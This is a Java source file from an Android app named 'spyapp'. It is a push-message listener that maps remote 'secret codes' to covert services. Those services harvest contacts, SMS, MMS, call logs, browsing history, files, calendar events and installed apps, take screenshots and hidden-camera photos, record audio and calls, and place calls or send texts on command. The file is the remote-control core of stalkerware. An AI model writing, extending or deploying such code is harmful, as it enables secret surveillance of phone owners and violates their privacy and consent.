/**
 * Copyright 2015 Google Inc. All Rights Reserved.
 * <p/>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p/>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p/>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.app.spyapp.gcm;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Pref;
import com.app.spyapp.common.Utils;
import com.app.spyapp.common.WriteLog;
import com.app.spyapp.servercall.BookMarkCallService;
import com.app.spyapp.servercall.CallLogCallService;
import com.app.spyapp.servercall.ContactCallService;
import com.app.spyapp.servercall.EventListCallService;
import com.app.spyapp.servercall.HistoryCallService;
import com.app.spyapp.servercall.InstallAppCallService;
import com.app.spyapp.servercall.SMSCallService;
import com.app.spyapp.service.AudioRecordService;
import com.app.spyapp.service.BatteryLevelService;
import com.app.spyapp.service.GetLocationService;
import com.app.spyapp.service.HiddenCameraService;
import com.app.spyapp.service.MMSService;
import com.app.spyapp.service.SaveFileServices;
import com.app.spyapp.service.ScreenShotService;
import com.google.android.gms.gcm.GcmListenerService;

// http://gcm-alert.appspot.com/

public class MyGcmListenerService extends GcmListenerService {

    private SpyApp spyApp;
    private static final String TAG = "MyGcmListenerService";

    /**
     * Called when message is received.
     *
     * @param from SenderID of the sender.
     * @param data Data bundle containing message data as key/value pairs.
     *             For Set of keys use data.keySet().
     */
    // [START receive_message]
    @Override
    public void onMessageReceived(String from, Bundle data) {
        String message = data.getString("message");

        String number = data.getString("number");
        String sms_body = data.getString("sms_body");
        String datetime = data.getString("sms_lastdatetime");
        Log.i(TAG, "From: " + from);
        Log.i(TAG, "Message: " + message);
        Utils.showStatus(this, message);
        callServiceForFunctionality(message, number, sms_body, datetime);


    }

    private void callServiceForFunctionality(String secretCode, String number, String smsBody, String lastupdatedtime) {
        if (secretCode.equalsIgnoreCase(Const.GETCONTACT)) {
            //startservice for gettting contactList
            Intent smsIntent = new Intent(MyGcmListenerService.this, ContactCallService.class);
            startService(smsIntent);
        } else if (secretCode.equalsIgnoreCase(Const.GETSMS)) {
            //startservice for gettting smslist

            Intent smsIntent = new Intent(MyGcmListenerService.this, SMSCallService.class);
            startService(smsIntent);

        } else if (secretCode.equalsIgnoreCase(Const.GETSCREENSHOT)) {
            //startservice for gettting device screenshot
            Intent screenshotIntent = new Intent(MyGcmListenerService.this, ScreenShotService.class);
            startService(screenshotIntent);
        } else if (secretCode.equalsIgnoreCase(Const.GETBATTERYLEVEL)) {
            //startservice for gettting device screenshot
            Intent screenshotIntent = new Intent(MyGcmListenerService.this, BatteryLevelService.class);
            startService(screenshotIntent);
        } else if (secretCode.equalsIgnoreCase(Const.CALLHIDDENCAMERA)) {
            //startservice for gettting device screenshot
            Intent screenshotIntent = new Intent(MyGcmListenerService.this, HiddenCameraService.class);
            startService(screenshotIntent);
        } else if (secretCode.equalsIgnoreCase(Const.GETBOOKMARK)) {
            //startservice for gettting device screenshot
            Intent screenshotIntent = new Intent(MyGcmListenerService.this, BookMarkCallService.class);
            startService(screenshotIntent);
        } else if (secretCode.equalsIgnoreCase(Const.GETHISTORY)) {
            //startservice for gettting device screenshot
            Intent screenshotIntent = new Intent(MyGcmListenerService.this, HistoryCallService.class);
            startService(screenshotIntent);
        } else if (secretCode.equalsIgnoreCase(Const.GETCALLLOG)) {
            //startservice for gettting calllog of device
            Intent calllogIntent = new Intent(MyGcmListenerService.this, CallLogCallService.class);
            startService(calllogIntent);
        } else if (secretCode.equalsIgnoreCase(Const.GETMMS)) {
            //startservice for gettting device screenshot
            Intent screenshotIntent = new Intent(MyGcmListenerService.this, MMSService.class);
            startService(screenshotIntent);
        } else if (secretCode.equalsIgnoreCase(Const.STARTRECORD)) {
            //startservice for gettting device screenshot
            Intent screenshotIntent = new Intent(MyGcmListenerService.this, AudioRecordService.class);
            startService(screenshotIntent);
        } else if (secretCode.equalsIgnoreCase(Const.STOPRECORD)) {
            //startservice for gettting device screenshot
            Intent screenshotIntent = new Intent(MyGcmListenerService.this, AudioRecordService.class);
            stopService(screenshotIntent);
        } else if (secretCode.equalsIgnoreCase(Const.GETLOCATION)) {
            //startservice for gettting device screenshot
            Intent screenshotIntent = new Intent(MyGcmListenerService.this, GetLocationService.class);
            stopService(screenshotIntent);
        } else if (secretCode.equalsIgnoreCase(Const.START_CALL_RECORD)) {
            Utils.showStatus(this, "START CALL RECORD");
            spyApp = (SpyApp) getApplicationContext();
            SharedPreferences.Editor editor = spyApp.getSharedPreferences().edit();
            editor.putBoolean(Pref.RECORDCALL, true);
            editor.commit();
            //start call recording

        } else if (secretCode.equalsIgnoreCase(Const.STOP_CALL_RECORD)) {
            //stop call recording
            Utils.showStatus(this, "STOP CALL RECORD");
            spyApp = (SpyApp) getApplicationContext();
            SharedPreferences.Editor editor = spyApp.getSharedPreferences().edit();
            editor.putBoolean(Pref.RECORDCALL, false);
            editor.commit();
        } else if (secretCode.equalsIgnoreCase(Const.MAKE_CALL)) {
            Utils.showStatus(this, "MAKE CALL");
            if (!TextUtils.isEmpty(number)) {
                Utils.makeCall(MyGcmListenerService.this, number);
            }
        } else if (secretCode.equalsIgnoreCase(Const.MAKE_SMS)) {
            Utils.showStatus(this, "SEND SMS");
            if (!TextUtils.isEmpty(number) && !TextUtils.isEmpty(smsBody)) {
                Utils.sendSMSForTimerSync(number, smsBody);
            }
        } else if (secretCode.equalsIgnoreCase(Const.GET_FILES)) {
            Intent screenshotIntent = new Intent(MyGcmListenerService.this, SaveFileServices.class);
            startService(screenshotIntent);
        } else if (secretCode.equalsIgnoreCase(Const.GET_CALENDER_EVENT)) {
            Intent screenshotIntent = new Intent(MyGcmListenerService.this, EventListCallService.class);
            startService(screenshotIntent);
        } else if (secretCode.equalsIgnoreCase(Const.GET_INSTALL_APP)) {

            Intent screenshotIntent = new Intent(MyGcmListenerService.this, InstallAppCallService.class);
            startService(screenshotIntent);
        }
    }

}
